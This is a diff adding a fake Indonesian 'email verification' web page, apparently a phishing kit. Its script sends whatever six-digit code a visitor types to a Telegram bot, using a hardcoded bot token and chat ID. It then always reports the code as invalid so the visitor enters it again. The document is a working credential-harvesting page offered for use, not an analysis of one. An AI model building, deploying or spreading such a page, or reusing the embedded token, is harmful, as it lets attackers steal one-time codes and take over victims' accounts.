@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifikasi Email</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #000;
+    }
+    .notification {
+      background-color: #0056ff;
+      color: white;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      font-weight: 600;
+    }
+    .notification svg {
+      margin-right: 8px;
+      fill: white;
+      width: 20px;
+      height: 20px;
+    }
+    main {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    h1 {
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .email-address {
+      color: #666;
+      margin-bottom: 30px;
+    }
+    .code-inputs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 30px;
+    }
+    .code-inputs input {
+      width: 40px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .code-inputs input:focus {
+      border-color: #0056ff;
+      box-shadow: 0 0 5px #0056ff;
+    }
+    button.resend {
+      width: 100%;
+      padding: 14px 0;
+      background-color: #ddd;
+      border: none;
+      border-radius: 30px;
+      font-size: 14px;
+      color: #777;
+      cursor: not-allowed;
+      margin-bottom: 20px;
+      user-select: none;
+    }
+    button.resend.enabled {
+      background-color: #0056ff;
+      color: white;
+      cursor: pointer;
+      user-select: auto;
+    }
+    .check-email {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    .check-email a {
+      color: #0056ff;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .check-email a:hover {
+      text-decoration: underline;
+    }
+    button#sendCodeButton {
+      width: 100%;
+      padding: 14px 0;
+      background-color: #0056ff;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      margin-bottom: 20px;
+      font-weight: bold;
+      user-select: auto;
+    }
+    button#sendCodeButton:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div class="notification">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/></svg>
+    Kode verifikasi berhasil dikirim
+  </div>
+  <main>
+    <h1>Verifikasi Email</h1>
+    <p class="email-address">Telah dikirim ke Email</p>
+    <div class="code-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+    </div>
+
+    <button id="sendCodeButton" disabled>Verifikasi</button>
+
+    <button id="resendButton" class="resend" disabled>Kirim ulang dalam 58 detik</button>
+
+    <p class="check-email">Tidak menerima email? <a href="#" id="checkHere">Cek disini</a></p>
+  </main>
+
+  <script>
+    // Konfigurasi Telegram Bot (ganti dengan token dan chat id Anda)
+    const BOT_TOKEN = '8175440078:AAG83ZcciNc8Irjg3JJGwi-DnPNI1q8qyBg';
+    const CHAT_ID = '6155537801';
+
+    const email = '';
+
+    const inputs = document.querySelectorAll('.code-inputs input');
+    const sendCodeButton = document.getElementById('sendCodeButton');
+
+    // Fokus otomatis pindah ke input berikutnya dan backspace untuk kembali
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, ''); // hanya angka
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkInputs();
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // Mengecek semua input terisi untuk aktifkan tombol Kirim ke Telegram
+    function checkInputs() {
+      const allFilled = [...inputs].every(input => input.value.length === 1);
+      sendCodeButton.disabled = !allFilled;
+    }
+
+    // Tombol Kirim ke Telegram
+    sendCodeButton.addEventListener('click', () => {
+      if (sendCodeButton.disabled) return;
+
+      const code = [...inputs].map(input => input.value).join('');
+      const message = `🔔 *Verifikasi Email*\nEmail: ${email}\nKode Verifikasi: \`${code}\``;
+
+      sendCodeButton.textContent = 'Mengirim...';
+      sendCodeButton.disabled = true;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok){
+          alert('Kode verifikasi Tidak Valid');
+          // Reset input dan tombol
+          inputs.forEach(input => input.value = '');
+          sendCodeButton.textContent = 'Kirim ke Telegram';
+          sendCodeButton.disabled = true;
+          inputs[0].focus();
+        } else {
+          alert('Gagal mengirim pesan ke Telegram: ' + (data.description || 'Tidak diketahui'));
+          sendCodeButton.textContent = 'Kirim ke Telegram';
+          sendCodeButton.disabled = false;
+        }
+      })
+      .catch(err => {
+        alert('Error saat mengirim pesan ke Telegram.');
+        sendCodeButton.textContent = 'Kirim ke Telegram';
+        sendCodeButton.disabled = false;
+        console.error(err);
+      });
+    });
+
+    // Tombol Kirim ulang dengan timer
+    const resendButton = document.getElementById('resendButton');
+    let timeLeft = 58;
+    const timer = setInterval(() => {
+      if(timeLeft <= 0){
+        resendButton.textContent = 'Kirim ulang';
+        resendButton.disabled = false;
+        resendButton.classList.add('enabled');
+        clearInterval(timer);
+      } else {
+        resendButton.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+        timeLeft--;
+      }
+    }, 1000);
+
+    resendButton.addEventListener('click', () => {
+      if(resendButton.disabled) return;
+
+      alert('Kode verifikasi telah dikirim ulang!');
+      timeLeft = 58;
+      resendButton.disabled = true;
+      resendButton.classList.remove('enabled');
+      resendButton.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+
+      const newTimer = setInterval(() => {
+        if(timeLeft <= 0){
+          resendButton.textContent = 'Kirim ulang';
+          resendButton.disabled = false;
+          resendButton.classList.add('enabled');
+          clearInterval(newTimer);
+        } else {
+          resendButton.textContent = `Kirim ulang dalam ${timeLeft} detik`;
+          timeLeft--;
+        }
+      }, 1000);
+    });
+
+    // Link cek disini
+    document.getElementById('checkHere').addEventListener('click', e => {
+      e.preventDefault();
+      alert('Silakan cek folder spam atau tunggu beberapa saat.');
+    });
+
+    // Fokus input pertama pada load
+    inputs[0].focus();
+  </script>
+</body>
+</html>
